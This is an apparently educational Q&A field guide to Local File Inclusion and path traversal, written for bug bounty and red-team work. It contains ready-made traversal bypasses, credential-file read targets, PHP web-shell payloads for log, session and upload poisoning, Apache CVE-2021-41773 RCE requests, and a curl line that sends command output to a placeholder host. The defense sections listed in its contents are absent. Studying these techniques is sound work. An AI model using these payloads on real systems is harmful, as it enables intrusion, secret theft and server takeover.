# Local File Inclusion / Path Traversal (LFI) — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **LFI & path traversal** — from "what is it" to source/secret
> disclosure and every LFI→RCE path (log poisoning, `php://filter` chains, session/`/proc` poisoning, wrappers,
> upload+include, phpinfo race), plus server-level traversal CVEs and second-order LFI. Q&A format, progressive
> difficulty. Covers traversal, suffix/encoding/allowlist bypasses, wrappers, RCE, tooling, methodology, real-world
> CVEs, **and** defense.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, and learning. Prove with a **benign
> file** (`/etc/hostname`/`/etc/passwd`) and a **benign RCE marker** (a unique `echo`/`id`), read the **minimum**
> redacted secret content, validate disclosed creds **read-only**, and **clean up** poisoned logs/sessions/uploads.
> Never test systems you don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- PortSwigger Web Security Academy — *File path traversal* & *File inclusion* (+ labs)
- PayloadsAllTheThings — *File Inclusion* & *Directory Traversal* · HackTricks — *LFI/RFI* & *LFI2RCE*
- `synacktiv/php_filter_chain_generator` (file-write-free RCE) · LFISuite / liffy / Kadimus · SecLists (Fuzzing/LFI)
- CVE-2021-41773 / CVE-2021-42013 (Apache traversal→RCE), nginx `alias` off-by-slash, phar:// deserialization (Sam Thomas, BlackHat 2018)
- Companion kit in this repo: `Web/LFI/` (guide + arsenal + checklist + report template + `poc/`)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q10)
- **Level 1 — Recon & baseline** (Q11–Q20)
- **Level 2 — Reaching the file (traversal & bypasses)** (Q21–Q34)
- **Level 3 — Wrappers & source/secret disclosure** (Q35–Q44)
- **Level 4 — LFI → RCE (every path)** (Q45–Q62)
- **Level 5 — Windows, other stacks, server-traversal CVEs, second-order & chains** (Q63–Q78)
- **Tooling** (Q79–Q82)
- **Methodology & triage** (Q83–Q86)
- **Cheat sheets** (Q87–Q91)
- **Real-world patterns & references** (Q92–Q94)
- **Defense — preventing LFI** (Q95–Q100)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is LFI / path traversal?
A parameter influences a **path** passed to a file API (`include`/`require`/`readfile`/`fopen`/`open`/`sendFile`). If you can steer that path with `../` (or an absolute path / a wrapper), you **read** — or, when the sink **executes** the file, **run** — content of your choosing. "Path traversal" = the directory-escape technique; "LFI" = the broader class (read **or** include a local file).

### Q2. LFI vs RFI vs directory traversal — distinctions?
- **Path traversal** = escaping the intended directory with `../` to reach an arbitrary **local** path (read).
- **LFI** = the app includes/reads a **local** file you influence (traversal is how you reach it). Can be read-only or executing.
- **RFI** = the app includes a **remote** file you control → direct RCE (separate kit). LFI is local-only.

### Q3. Read vs Include — why does it decide everything?
- **READ/RETURN** sink (`readfile`, `file_get_contents`→echo, `sendFile`) → you get **disclosure** (source/secrets/sensitive files). High if it's secrets.
- **INCLUDE/EXECUTE** sink (PHP `include`/`require`, some template engines) → poisoned content **runs** → **RCE**. Highest ceiling.
Identify which you have early — it sets your whole plan.

### Q4. Why does LFI pay so well?
Because its ceiling is **RCE** (on PHP via logs/wrappers/sessions/upload), and even read-only LFI yields **secrets/source** (config, `.env`, keys, `web.config` machineKey, cloud creds, k8s tokens) → lateral movement / cloud takeover. A single `?page=` can become a shell.

### Q5. What's the #1 mistake when reporting LFI?
Reporting **`/etc/passwd`** and stopping. `passwd` is a **non-sensitive** file by design — it's *proof of traversal* (~Medium), not impact. The finding is **(a)** reading **real secrets/source** or **(b)** turning the read into **RCE**. Always climb past `passwd`.

### Q6. What's the whole game, in one line?
**Reaching the file + controlling enough of the path.** Defenses force a prefix dir, append a suffix (`.php`), strip `../`, or allowlist names. Your job is to **escape the directory** and **defeat the suffix/filter** so the sink reads/includes the path you want.

### Q7. Where do LFI sinks live?
Params: `page= file= path= template= lang= view= include= doc= download= read= theme= module= cat= img= report=`. Features: template/theme/lang loaders, "download/view document", PDF/report builders, log viewers, file managers, plugin/module loaders, avatar/path handlers. Sinks (grep): `include/require/readfile/file_get_contents/fopen/show_source` (PHP); `fs.readFile/sendFile/res.render` (Node); `open/send_file/Template` (Py); `File/getResourceAsStream` (Java); `Server.MapPath/@Html.Partial` (.NET).

### Q8. What's the mental model?
An LFI sink is a **read/exec primitive pointed at the local filesystem.** Severity = whether you can point it at **secrets** (disclosure) or get it to **execute attacker content** (RCE). Always push toward execute.

### Q9. What do I need to learn first?
An intercepting proxy; the difference between **read vs include**; URL/double encoding; PHP **wrappers** (`php://filter`, `data://`, `expect://`, `phar://`); how logs/sessions are written (for poisoning); and benign-marker discipline (prove RCE with `echo <token>`/`id`, prove disclosure with minimal redacted content).

### Q10. What's the highest-to-lowest impact ordering?
① **LFI → RCE/shell** (log poison / filter-chain / session / wrappers / upload) — Critical → ② **source + secret disclosure** (`php://filter` of config/.env/keys → creds → pivot) — High–Critical → ③ **arbitrary sensitive file read** (`/proc/self/environ`, k8s/cloud creds, `web.config`) — High → ④ **`/etc/passwd`-class read** — Medium → ⑤ blind/limited reads — Low–Medium.

---

# LEVEL 1 — RECON & BASELINE

### Q11. How do I find file/path sinks?
Fuzz the param **names** (Arjun/param-miner) across endpoints; test anything that returns a **file** (downloads, "view document", export, report, image-by-path, attachment handlers); template/lang/theme switches (`?lang=en`, `?theme=dark`, `?view=home`); grep JS/source (JS-files kit) for include/readFile/sendFile/render with user input; read error messages for base dirs/suffixes; and check Wayback for old `file`/`path` params.

### Q12. How do I confirm traversal (the baseline)?
Read a known file, sweeping depth 1–12:
```
Linux:   ?page=../../../../etc/passwd       → "root:x:0:0:"   ;   ?page=../../../../etc/hostname  (benign marker)
Windows: ?page=..\..\..\..\Windows\win.ini  → "[fonts]"/"[extensions]"   ;   ?page=C:\Windows\win.ini
```
Over-traversing is safe (the filesystem ignores extra `../` at root), so over-shoot the depth.

### Q13. How do I tell READ from INCLUDE?
Point the sink at a known **PHP** file (e.g., `index.php`). If you get the **raw source/text** → READ sink (use `php://filter`, disclosure). If you get the **executed output** (or your poisoned PHP runs) → INCLUDE sink (push to RCE). This single test sets your strategy.

### Q14. How do I detect a forced prefix/suffix?
**Suffix:** request `?page=/etc/passwd` and watch for an error like "`/etc/passwd.php` not found" → a `.php` suffix is appended (§ defeat it). **Prefix:** if only files under a base dir load → a prefix dir → you must traverse **out** of it. Errors/stack traces reveal both the base dir and the suffix.

### Q15. How do I fingerprint the stack?
`.php` in paths/errors → PHP (wrappers + log/session RCE). Server header, error format, file extensions, framework cookies → Java/Node/Python/.NET/Ruby (§Level 5). The stack decides whether `php://filter`/log-poisoning apply or whether you pivot to SSTI/RFI/upload.

### Q16. What does the baseline tell me to do next?
The **base dir + suffix** → how many `../` and which suffix bypass. **PHP?** → `php://filter` to dump source/secrets is your immediate next move. **Include sink?** → plan the RCE path (logs/wrappers/session). **Read-only non-PHP?** → focus on secret/source disclosure + SSTI pivot.

### Q17. Why not just report the `/etc/passwd` read from baseline?
Because it's **traversal confirmation (~Medium)**, not impact (Q5). Use baseline to *prove the primitive*, then immediately escalate to secrets/source (`php://filter`) or RCE. The report leads with the highest thing you demonstrate.

### Q18. What's a benign proof for the baseline?
`/etc/hostname` (single-line, non-sensitive) or `/etc/passwd` (conventional proof) on Linux; `win.ini` on Windows. These prove the read without exfiltrating anything sensitive. Save secret reads for the impact phase (minimal + redacted).

### Q19. What is blind LFI and how do I confirm it?
No file contents are returned, but you have an **oracle** — different status/error/timing for an existing vs non-existing file, or an OOB hit (a wrapper that fetches a URL). Confirm reads via the oracle, then pivot to a wrapper that yields output or to log/session poisoning that produces a visible RCE marker.

### Q20. What's the deliverable from baseline?
Confirmed traversal + the sink class (read/include) + the stack + any forced prefix/suffix + the filter behavior. That tells you exactly which Part-II bypass and which impact path to pursue.

---

# LEVEL 2 — REACHING THE FILE (TRAVERSAL & BYPASSES)

### Q21. Basic traversal payloads?
`../../../../etc/passwd` (sweep depth 1–12), `/etc/passwd` (absolute, if no forced prefix), and over-shoot the `../` count (extra ones are harmless). On Windows use `..\..\..\..\Windows\win.ini` or `C:\Windows\win.ini`.

### Q22. The app appends `.php` — how do I defeat the forced suffix?
```
null byte (legacy PHP<5.3.4):  ../../../../etc/passwd%00
path truncation (legacy):      ../../../etc/passwd/././…(×2048)
php://filter:                  the suffix becomes part of the resource → you still read source (§Level 3)
use the suffix:                target real .php files (read their source via php://filter) — suffix is fine then
poison a real on-disk path:    log/session whose path you control (the suffix lands on a real file, §Level 4)
```

### Q23. `../` is filtered — how do I bypass?
```
URL-encode:        ..%2f..%2f..%2fetc%2fpasswd
double URL-encode: ..%252f..%252f..%252fetc%252fpasswd      (decoded twice somewhere in the stack)
nested (defeats one-pass strip):  ....//....//etc/passwd    ..././..././etc/passwd      ← the most reliable
overlong UTF-8:    ..%c0%af..%c0%afetc/passwd               (legacy)
backslash (win/mixed): ..\..\..\..\windows\win.ini  ·  ..%5c..%5c..
```

### Q24. Why does `....//` work?
If the filter strips `../` **exactly once** (non-recursively), `....//` becomes `../` **after** the strip → the rebuilt traversal survives. It's the single most reliable bypass against naive one-pass `../` removal.

### Q25. When do I use double-encoding (`%252f`)?
When the stack **decodes input twice** (or a WAF decodes once and the app once more). `%252f` → `%2f` → `/`. Test it when single-encoding is filtered/normalized.

### Q26. How do I beat an allowlist/prefix requirement?
Satisfy the required prefix, then traverse out: `?file=/var/www/html/uploads/../../../../etc/passwd`. For "starts with an allowed value": `?lang=en/../../../../etc/passwd`. Combine with §23 encoding if `../` is also filtered.

### Q27. The null byte — does it still work?
Only on **legacy** PHP (< 5.3.4) and some old Java. It truncates the appended suffix (`...passwd%00` → `.php` dropped). Modern PHP ignores it. Try it (cheap), but don't rely on it — prefer `php://filter` / `....//`.

### Q28. What if `../` is replaced with empty recursively (so `....//`→`/`)?
Then `....//` collapses. Try **`..././`**, mixed `....\/`, or encoded variants (`%2e%2e%2f`), or pivot to a wrapper (`php://filter`) that doesn't need `../` at all when you can give an absolute-ish resource.

### Q29. Mixed/Windows separators?
On Windows (or mixed parsers) `..\` and `..%5c` work alongside `../`. Try both `/` and `\` and their encodings; some normalizers handle one but not the other.

### Q30. How do I find the right traversal depth?
Sweep: try increasing `../` counts (1–12). You don't know how deep the script lives, and **over-traversing is safe** (filesystem ignores extra `../` at root). Stop when `/etc/passwd` resolves.

### Q31. What if there's a forced prefix directory I can't escape?
Keep adding `../` (depth-sweep) to climb out; combine with `....//`/`%252f` if `../` is filtered. If the prefix is enforced by a `realpath`-style canonical check that pins inside a base dir, traversal may be truly blocked — pivot to a wrapper or a different sink.

### Q32. Can I read a file the app already serves?
That's intended behavior (not LFI). The bug is reading **outside** the intended directory (traversal) or reading **secrets/source**. Reading a public asset the app is meant to serve is a false positive.

### Q33. The end-state of Level 2?
An **arbitrary file path** reaching the sink despite any prefix/suffix/filter. Now read secrets/source (Level 3) or set up RCE (Level 4).

### Q34. Should I report a traversal that only reaches one harmless directory?
No — that's limited. Escalate to **secrets/source** or an **includable/poisonable** file. A traversal confined to non-sensitive files is Low; keep pushing for impact.

---

# LEVEL 3 — WRAPPERS & SOURCE/SECRET DISCLOSURE

### Q35. What is `php://filter` and why is it the fastest win?
On PHP, `php://filter/convert.base64-encode/resource=config.php` returns the **base64 of the file's source** (not its executed output) — so you exfiltrate **source code and secrets** even from a READ sink, and even when a `.php` suffix is forced (the suffix becomes part of the resource). Decode locally:
```bash
curl -s "https://t/?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d
```

### Q36. How do I "walk the app" with `php://filter`?
Dump `index.php`, read its `include`/`require` lines, then dump each referenced file (`config.php`, `database.php`, `.env` loader, `auth.php`, `admin.php`). You reconstruct the source tree → find DB/cloud creds, more sinks, and the path to RCE.

### Q37. What high-value files should I read?
`config.php`/`database.php`/`settings.php`/`wp-config.php`/`.env`/`app/config/*`; `/proc/self/environ` (env vars/secrets); `~/.aws/credentials`; `~/.ssh/id_rsa`; `/var/run/secrets/kubernetes.io/serviceaccount/token`; `/etc/nginx/nginx.conf`/`/etc/apache2/*`; `.git/config`; on Windows `web.config` (conn strings + `machineKey`), `applicationHost.config`.

### Q38. What other PHP/protocol wrappers matter?
`php://filter` (read source), `php://input` (POST body as PHP → RCE if `allow_url_include`), `data://` (inline PHP → RCE), `expect://` (run a command), `phar://` (deserialization → object injection → RCE), `zip://` (include a file inside an uploaded zip). Always test which the fetcher accepts.

### Q39. How do I know if `allow_url_include` is on?
Dump `php.ini`/a `phpinfo` page via `php://filter`, or just **test**: `?page=data://text/plain;base64,<b64 of <?php echo 1337*1338;?>>` → if `1788906` appears, `data://` (and `allow_url_include`) is on → instant RCE (Level 4).

### Q40. What's the impact of source disclosure alone?
**High** for proprietary source; **High–Critical** when it contains **secrets** (DB/cloud creds, API keys, the JWT/Flask signing secret, `machineKey`). Validate any creds read-only (SSRF/JS-files discipline), redact, and chase the pivot (DB, cloud, token forgery).

### Q41. How do I read environment variables / process info?
`/proc/self/environ` (env vars — often secrets/tokens), `/proc/self/cmdline` (the command line/args), `/proc/self/status`, `/proc/self/cwd/` (app working dir), `/proc/self/fd/<n>` (open file descriptors incl. logs). These are gold on Linux.

### Q42. Can a wrapper itself be SSRF?
`expect://`/`data://`/`php://input` are local execution. But on some stacks the path is fetched as a URL (or RFI-style) → SSRF. Also, an LFI that includes a remote/UNC path crosses into RFI (separate kit). Note any outbound fetch as SSRF.

### Q43. What's the chain from disclosed creds?
Disclosed **DB/cloud creds** → validate read-only → pivot to the DB (data theft; some DBs → RCE) or cloud (often RCE there). Disclosed **private key / k8s SA token** → host/cluster access. Disclosed **signing secret** → forge JWT/session (JWT kit). Source disclosure is rarely the end — it's the start of a chain.

### Q44. When is `php://filter` *not* worth reporting?
When it only reads a **non-sensitive** file (no secrets/source value). Dump something that matters (`config`/`.env`/source) — a `php://filter` of a public template is Low.

---

# LEVEL 4 — LFI → RCE (EVERY PATH)

### Q45. What's the headline of LFI exploitation?
**LFI → RCE.** On PHP especially, an *include* sink is frequently a path to a shell via: **log poisoning**, **`php://filter` chain**, **session-file poisoning**, **`data://`/`php://input` wrappers**, **`/proc/self/environ`**, **phpinfo race**, **`phar://` deserialization**, or **upload+include**. Always try to reach RCE before reporting.

### Q46. How does log poisoning work?
If the sink **includes** files and you can write attacker text into a log the server includes:
```
1. Poison a log: put PHP in a logged field — User-Agent: <?php system($_GET['c']); ?>  (lands in access.log)
2. Include the log: ?page=../../../../var/log/apache2/access.log&c=id  → the PHP in the log executes → RCE.
```
Logs: apache/nginx access+error, `auth.log` (SSH), `mail.log`, `vsftpd.log`, `/proc/self/fd/N`.

### Q47. SSH/mail log poisoning — when?
When you can't reach the web log. SSH: `ssh '<?php system($_GET[c]);?>'@target` → the failed-login attempt lands in `/var/log/auth.log` → include it. Mail: send SMTP with PHP in a header → `/var/log/mail.log`. Useful alternates to access.log.

### Q48. What is the `php://filter` chain RCE (file-write-free)?
A modern technique: chain iconv-based `php://filter` conversions so the decoded output of an empty resource **becomes arbitrary PHP**, which the **include** then executes — **no writable file, no remote URL** (works even with `allow_url_include=Off`). Generate with `synacktiv/php_filter_chain_generator.py`:
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'   # paste into ?page= , add &c=id
```

### Q49. When is the filter-chain the right choice?
When you have a PHP **include** sink but **no log access, no upload, `allow_url_include=Off`**. The filter-chain needs only the single LFI parameter and no writable location — it's the go-to modern LFI→RCE when poisoning/upload aren't available.

### Q50. How does PHP session poisoning work?
```
1. Sessions store at /var/lib/php/sessions/sess_<PHPSESSID> (or /tmp/sess_<ID>).
2. Get attacker text into your session (a username/field reflected into $_SESSION): set it to <?php system($_GET['c']); ?>
3. Include your session file: ?page=../../../../var/lib/php/sessions/sess_<YOUR_ID>&c=id → RCE.
```
Reliable when web logs aren't readable but the session dir is.

### Q51. `/proc` poisoning?
`/proc/self/environ` — if your input lands in an env var (User-Agent on old CGI) and the include reads it → RCE. `/proc/self/fd/<n>` — brute the fd numbers to find an includable, poisoned log. `/proc/self/cmdline` — sometimes attacker-controlled.

### Q52. `data://` and `php://input` RCE?
Need `allow_url_include=On`:
```
data://: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   (b64 = <?php system($_GET['c']);?>)
php://input: ?page=php://input   POST body: <?php system($_GET['c']); ?>   (?c=id)
```
The cleanest RCE when `allow_url_include` is on.

### Q53. `expect://` RCE?
`?page=expect://id` runs the command directly — needs the (uncommon) `expect` PHP extension. Try it; it's instant when available.

### Q54. What is `phar://` deserialization RCE?
A crafted `.phar` archive carries **serialized metadata** that PHP **unserializes** when any file op touches the phar path (`file_exists`, `fopen`, `getimagesize`, `include`). If you can upload a phar (often disguised as an image) and the app uses vulnerable classes (a POP gadget), `?page=phar://uploaded.phar/x` → object injection → RCE — **no `allow_url_include` needed**.

### Q55. Upload + include?
If an **upload** feature exists (any file type) and the LFI **includes**:
```
1. Upload ANY file whose CONTENT is PHP (an image with PHP appended/in EXIF, a .txt) — extension may not matter.
2. Include the uploaded file by its on-disk path: ?page=../../../../var/www/uploads/avatar.jpg&c=id → RCE.
zip:// variant: upload shell.jpg that's a zip containing shell.php → ?page=zip://.../avatar.jpg%23shell.php
```
Cross-ref the FileUpload kit for getting the bytes accepted.

### Q56. What is the phpinfo LFI race?
If a `phpinfo()` page exists, a multipart upload creates a **temp file** (`/tmp/php??????`) whose name is shown in phpinfo's output. **Race:** read the temp filename from phpinfo and include it **before PHP deletes it** → RCE. LFISuite automates this; it's the classic "LFI without an obvious writable file."

### Q57. How do I prove LFI→RCE safely?
Run a **benign marker** only — `echo <unique-token>` or `id`/`whoami`. Seeing `RCE-POC-7f3a9` or `uid=...` in the response is a complete Critical PoC. **Don't** drop a persistent web shell, run destructive commands, or pivot beyond proof. **Clean up** poisoned logs/sessions/uploads.

### Q58. Which RCE path do I try first?
For a **READ** sink (PHP): `php://filter` dump → then the **filter-chain** RCE. For an **INCLUDE** sink: log poisoning → session poisoning → `data://`/`php://input` (if allow_url_include) → upload+include → filter-chain. Pick by what's available; the filter-chain is the universal fallback.

### Q59. The forced `.php` suffix blocks raw reads — can I still RCE?
Yes. `php://filter` still reads source (suffix harmless). Log/session poisoning include **real on-disk paths** (the suffix lands on a real file). The filter-chain needs only the param. The suffix that blocks raw reads often doesn't block these RCE techniques.

### Q60. How do I exfiltrate RCE output if it's blind?
Make the executed code call back: `<?php system('curl http://YOUR.oast.fun/$(id|base64)'); ?>` → an OOB hit whose path carries `id` output proves execution. Or a `sleep` for a timing oracle. (Same discipline as command-injection OOB exfil.)

### Q61. What's the impact/severity of LFI→RCE?
**Critical** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, ~9.8). **CWE-98** (PHP file inclusion) / **CWE-94** (code exec). Full server compromise: source/secrets, DB/cloud, internal pivot.

### Q62. What if it's a READ sink only (no include) — top impact?
**Source + secret disclosure** (`php://filter`) → High–Critical when it yields live creds/keys (→ pivot/RCE elsewhere). Plus `/proc/self/environ`, `.aws/credentials`, k8s token → cloud/cluster. Read-only LFI is still High when it reaches secrets.

---

# LEVEL 5 — WINDOWS, OTHER STACKS, SERVER-TRAVERSAL CVEs, SECOND-ORDER & CHAINS

### Q63. How does LFI differ on Windows?
Use `..\` / `C:\`. Confirm with `win.ini`. Read secrets: `C:\inetpub\wwwroot\web.config` (conn strings + **`machineKey`**), `applicationHost.config`, `C:\Windows\repair\SAM`, `C:\xampp\php\php.ini`. RCE-ish: include IIS/FTP logs (`C:\inetpub\logs\LogFiles\...`) for log poisoning; UNC `\\attacker\share\shell.php` (RFI-style).

### Q64. Why is the .NET `machineKey` so valuable?
`web.config`'s `<machineKey>` signs/encrypts **ViewState** (and other tokens). With it, you **forge a valid ViewState** containing a serialized payload → **RCE** (ysoserial.net). So an LFI read of `web.config` on ASP.NET → machineKey → forged ViewState → RCE. A read-only LFI becomes Critical.

### Q65. LFI on Java / Node / Python / Ruby — what do I get?
Usually **disclosure**: read `WEB-INF/web.xml`/classes/`application.properties` (Java), `.env`/source (Node), `settings.py`/`.env` (Python), `secrets.yml`/`database.yml` (Ruby). RCE pivots: a template-engine include → **SSTI** (SSTI kit) → RCE; a dynamic `require()`/`__import__` of a poisoned file (Node/Python); Java class reads → deserialization gadget hunting.

### Q66. What are server/infrastructure path-traversal CVEs?
Traversal in the **web server/proxy**, not the app — language-independent:
- **Apache 2.4.49 (CVE-2021-41773) / 2.4.50 (CVE-2021-42013):** `/cgi-bin/.%2e/%2e%2e/.../etc/passwd` → **file read**, and **RCE** if `mod_cgi`/cgi-bin is enabled.
- **nginx `alias` off-by-slash:** `location /static { alias /path/; }` without a trailing slash → `GET /static../config` reads outside the root.
- **IIS/.NET** unicode/encoded-backslash traversal; **Tomcat/Spring** static-resource traversal → `/WEB-INF`.

### Q67. How do I exploit Apache 2.4.49/50?
```
file read:  GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
2.4.50:     GET /cgi-bin/.%%32%65/.%%32%65/.../etc/passwd   (double-encoded)
RCE (mod_cgi): POST /cgi-bin/.%2e/.../bin/sh   body:  echo Content-Type: text/plain; echo; id
```
Confirm the Apache version first (Server header / behavior). It's a server-level Critical needing no app param.

### Q68. What is the nginx `alias` off-by-slash bug?
When a `location /prefix` maps to `alias /dir/;` but the location lacks a trailing slash, a request to `/prefix../` resolves to the **parent** of `/dir/` → you read files **outside** the intended directory (app source, configs). `GET /static../app.py`.

### Q69. What is second-order / stored LFI?
The path you supply isn't included immediately — it's **stored** (a theme/template/locale/avatar-path/filename) and **included later** by a backend job, a different page, or an admin view. Plant a traversal/wrapper payload in the stored value, trigger the consumer, and it fires — often in a **higher-priv** context (broader filesystem access).

### Q70. How do I exploit second-order LFI?
```
1. Set a stored value to a payload: theme = ../../../../etc/passwd  (or php://filter/...resource=config.php)
2. Trigger the consumer (reload, run the job, get an admin to view your profile)
3. The stored path is included → file read / RCE in that context (watch for the read or an OOB hit for a wrapper).
```
It out-impacts reflected LFI when the consumer is a worker/admin tier.

### Q71. Chain: LFI → cloud takeover.
Read `/proc/self/environ` or `~/.aws/credentials` (or dump `.env`/config via `php://filter`) → **live cloud keys** → validate read-only (`aws sts get-caller-identity`) → cloud-account compromise / a cloud run-command surface → RCE. Stop at proof of access (SSRF-kit discipline).

### Q72. Chain: LFI → JWT/session forgery.
Disclose the **signing secret** (Flask `SECRET_KEY`, JWT HMAC secret, .NET `machineKey`) via source/config read → forge session cookies / JWTs (JWT kit) / ViewState → auth bypass / ATO. A read-only LFI becomes Critical through this chain.

### Q73. Chain: LFI + file upload → RCE.
Even on hardened uploads (allowlist + sandbox), if there's an **include** LFI: put PHP in the uploaded bytes (image/EXIF/txt) and **include the stored path** → shell. The upload doesn't need to allow `.php` — the LFI executes it. (Q55.)

### Q74. Chain: LFI → log/session → shell → internal pivot.
LFI → log/session poisoning → web shell → read internal config, reach internal services, grab cloud metadata from the box (SSRF kit from inside) → lateral movement. The LFI is the perimeter break.

### Q75. Chain: LFI source disclosure → find other bugs.
Dumped source reveals **hardcoded keys** (→ JWT/cloud), **endpoints/params** (→ IDOR/SSRF/injection), **SQL queries** (→ SQLi), and **other sinks**. Source disclosure is a force-multiplier for the whole engagement.

### Q76. How do I handle a strict allowlist + sandbox CDN + re-encoding (no RCE)?
Pivot from execution to **disclosure + chain**: dump source/secrets (`php://filter`), read `/proc/self/environ`/cloud creds, find the signing secret. Even when RCE is off the table, secret disclosure → pivot is often Critical.

### Q77. How do I escalate a "weak" LFI finding that pays?
`/etc/passwd` → read **secrets/source** (`php://filter`, `/proc/self/environ`, `.aws/credentials`). PHP include → **RCE** (log/filter-chain/session/wrapper/upload). Windows → `web.config` `machineKey` → forged ViewState RCE. Blind → wrapper output / log-poison marker / OOB exfil. Always push to secrets or RCE.

### Q78. What separates expert LFI testing from beginner?
The expert (1) **escalates past `/etc/passwd`** to secrets/RCE; (2) identifies **read vs include** and the stack first; (3) uses **`php://filter`** to dump source and the **filter-chain** for file-write-free RCE; (4) knows **log/session/`/proc`/wrapper/upload/phpinfo-race** RCE paths; (5) tests **server-level traversal CVEs** and **second-order** LFI; and (6) proves with a **benign marker**, validates creds read-only, and **cleans up**.

---

# TOOLING

### Q79. Core LFI toolkit?
**Burp** (tamper the path param); **ffuf/wfuzz** (`FUZZ` + SecLists `Fuzzing/LFI`, match `root:.*:0:0:`); the kit's `poc/` (`lfi_fuzz.py`, `phpfilter_dump.py`, `filter_chain_rce.py`, `logpoison.py`); **`synacktiv/php_filter_chain_generator`**; **LFISuite/liffy/Kadimus** (automated LFI→RCE — verify + clean up); **interactsh** (blind/OOB); **SecLists** wordlists.

### Q80. How do I fuzz for LFI efficiently?
```bash
ffuf -u "https://t/?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:.*:0:0:"
python3 poc/lfi_fuzz.py -u "https://t/?page=FUZZ" --signatures --wrappers
```
A signature match (`root:x:0:0:`) is a **candidate** — reproduce by hand, then escalate to secrets/RCE.

### Q81. How do I dump source/secrets and build RCE with the kit?
```bash
python3 poc/phpfilter_dump.py -u "https://t/?page=PHP" -r config.php -r .env -r database.php   # source/secrets
python3 poc/logpoison.py poison -u "https://t/" ; python3 poc/logpoison.py exec -u "https://t/?page=FUZZ" --cmd "echo LFI-POC"
python3 poc/filter_chain_rce.py --use-synacktiv --payload "<?php echo 'LFI-POC'; ?>"           # no-write RCE
```

### Q82. How do I build a reliable success oracle?
For **reads**: the response contains a file-content **signature** (`root:x:0:0:`, decoded base64 source). For **RCE**: the response contains your **benign marker** (`LFI-POC-7f3a9` / `uid=`), or an interactsh hit carrying command output (blind). Without an oracle you chase reflected-path false positives.

---

# METHODOLOGY & TRIAGE

### Q83. Step-by-step methodology.
**Recon** (every file/path sink) → **Baseline** (confirm traversal; read-vs-include; stack; prefix/suffix) → **Reach the file** (traversal + suffix/encoding/allowlist bypass) → **Wrappers** (`php://filter` dump source/secrets) → **Impact** (RCE: log/filter-chain/session/wrapper/upload; or secret disclosure) → **Windows/other/server-CVE/second-order** → **Report** (benign marker, redacted, CWE-98/22/73(+94), clean up).

### Q84. Quick triage decision tree.
- Read `/etc/passwd` → traversal confirmed (~Medium) — **escalate**.
- PHP READ sink → `php://filter` source/secrets → filter-chain RCE.
- PHP INCLUDE sink → log/session/`data://`/upload/filter-chain → RCE.
- Forced `.php` → `php://filter` / poison real paths / filter-chain.
- Windows/.NET → `web.config` `machineKey` → forged ViewState RCE.
- Apache 2.4.49/50 / nginx alias → server-level traversal (file read / RCE).
- Stored path consumed later → second-order LFI.
- Non-PHP read-only → secrets/source + SSTI pivot.

### Q85. False positives / auto-reject.
- `/etc/passwd` reported as **Critical** (it's ~Medium proof — escalate).
- A 404/error merely **echoing** your path (no file contents).
- Reading a file the app is **meant** to serve (public asset).
- `php://filter` of a **non-sensitive** file.
- **Blind timing** with no demonstrated read/RCE.
- A **client-side**/source-map file mislabeled as server LFI.

### Q86. What makes a great LFI report?
Title names the **impact** ("LFI in `<param>` → RCE via log poisoning" / "→ source & DB-credential disclosure"), CWE-98/22/73 (+CWE-94 if RCE), the exact endpoint/param + bypass + read-vs-include, the evidence (decoded source/secrets **redacted**, or the **benign RCE marker** output), a **cleanup** note, and one-finding-per-sink dedup.

---

# CHEAT SHEETS

### Q87. Traversal & bypass cheat sheet.
```
../../../../etc/passwd      /etc/passwd      ..\..\..\..\Windows\win.ini      C:\Windows\win.ini
suffix:  %00 (legacy) · php://filter (suffix harmless) · poison a real on-disk path
filter:  ....//....//etc/passwd  ·  ..%252f..%252fetc%252fpasswd  ·  ..%c0%af..  ·  ..%5c..
allowlist: /var/www/html/uploads/../../../../etc/passwd   ·   en/../../../../etc/passwd
```

### Q88. `php://filter` / wrappers cheat sheet.
```
SOURCE:  php://filter/convert.base64-encode/resource=config.php   (decode locally)
         php://filter/read=convert.iconv.UTF8.UTF16|convert.base64-encode/resource=...   (chain to dodge filters)
RCE:     data://text/plain;base64,<b64 php>&c=id   ·   php://input (POST=<?php ...?>)   ·   expect://id
         phar://up.phar/x (deserialization)   ·   zip://a.zip%23shell.php
         php://filter CHAIN (synacktiv generator) → no-write RCE
```

### Q89. High-value files cheat sheet.
```
Linux:   config.php .env wp-config.php database.yml settings.py application.properties .git/config
         /proc/self/environ /proc/self/cmdline ~/.aws/credentials ~/.ssh/id_rsa
         /var/run/secrets/kubernetes.io/serviceaccount/token  /etc/nginx/nginx.conf
Windows: C:\inetpub\wwwroot\web.config (machineKey!) applicationHost.config C:\Windows\repair\SAM
```

### Q90. LFI→RCE cheat sheet.
```
log poison:  UA: <?php system($_GET['c']);?>  →  ?page=../../../../var/log/nginx/access.log&c=id
session:     reflect <?php ...?> into $_SESSION  →  ?page=../../../../var/lib/php/sessions/sess_<ID>&c=id
/proc:       ?page=../../../../proc/self/environ&c=id  (poison via UA)
data://:     ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   (allow_url_include)
filter-chain: synacktiv generator → ?page=<chain>&c=id   (no write, no allow_url_include)
upload+incl: upload PHP-bytes → ?page=../../../../var/www/uploads/<file>&c=id
phpinfo race: leak /tmp/phpXXXXXX from phpinfo → include before deletion
```

### Q91. Server-traversal CVE cheat sheet.
```
Apache 2.4.49 (CVE-2021-41773): GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd   (+RCE via mod_cgi)
Apache 2.4.50 (CVE-2021-42013): double-encoded /cgi-bin/.%%32%65/...
nginx alias off-by-slash:        GET /static../config/app.py
IIS/.NET:                        ..%c0%af  ..%255c  /web.config;.aspx
